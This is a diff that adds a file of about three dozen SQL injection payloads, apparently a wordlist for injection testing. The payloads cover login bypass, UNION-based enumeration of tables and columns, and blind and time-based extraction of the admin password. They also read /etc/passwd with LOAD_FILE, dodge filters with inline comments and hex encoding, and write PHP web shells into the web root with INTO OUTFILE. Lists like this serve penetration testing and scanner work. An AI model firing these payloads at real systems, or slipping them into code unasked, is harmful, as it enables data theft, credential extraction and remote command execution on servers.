@@ -1,0 +1,36 @@
+' OR '1'='1
+' OR 1=1--
+' UNION SELECT NULL--                                      ' UNION SELECT 1,2,3--                                     ' UNION SELECT user(),database(),version()--
+'/**/OR/**/1=1--
+'/*!50000OR*/1=1--
+' OR 1=1#                                                  ' OR 1=1/*                                                 \' OR \'1\'=\'1                                            " OR "1"="1
+' OR '1'='1' LIMIT 1--
+'; WAITFOR DELAY '0:0:5'--
+'; SLEEP(5)--                                              '; BENCHMARK(10000000,MD5(1))--                            ' OR username LIKE '%admin%'
+' OR description LIKE '%{%'
+' OR MID(username,1,1)='a
+' OR LENGTH(password)=8--                                  ' OR ASCII(SUBSTR(username,1,1))=97--                      ' UNION SELECT @@version,NULL--                            ' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
+' UNION SELECT LOAD_FILE(0x2F6574632F706173737764),NULL--
+' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT NULL,"<?php eval($_POST['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php'--
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTR(password,1,1)='a')=1--
+' AND IF(SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--
+' AND IF(ASCII(SUBSTR((SELECT password FROM users WHERE username='admin'),1,1))=97,SLEEP(5),0)--
+' ORDER BY 1--
+' ORDER BY (SELECT password FROM users WHERE username='admin')--
+{"username":"admin'--","password":"any"}
+{"username":"admin' UNION SELECT 1,2,3--","password":"any"}
+' GROUP BY (SELECT 1 UNION SELECT 2)--
+' GROUP BY column_name HAVING 1=1--
+' OR username=0x61646d696e--
+' UNION SELECT 0x3C3F7068702073797374656D28245F4745545B27636D64275D293B203F3E,NULL--
+' UNION SELECT TO_BASE64(LOAD_FILE('/etc/passwd')),NULL--
+'/*!50000OR*/1=1--
+' OR '1'='1' /*!50000LIMIT*/ 1--
+'/*!50000UNION*//*!50000SELECT*/1,2,3--
+' OR IS_FREE_LOCK('test')=1--
+' OR RELEASE_LOCK('test')=1--
+' OR GET_LOCK('test',5)=1--
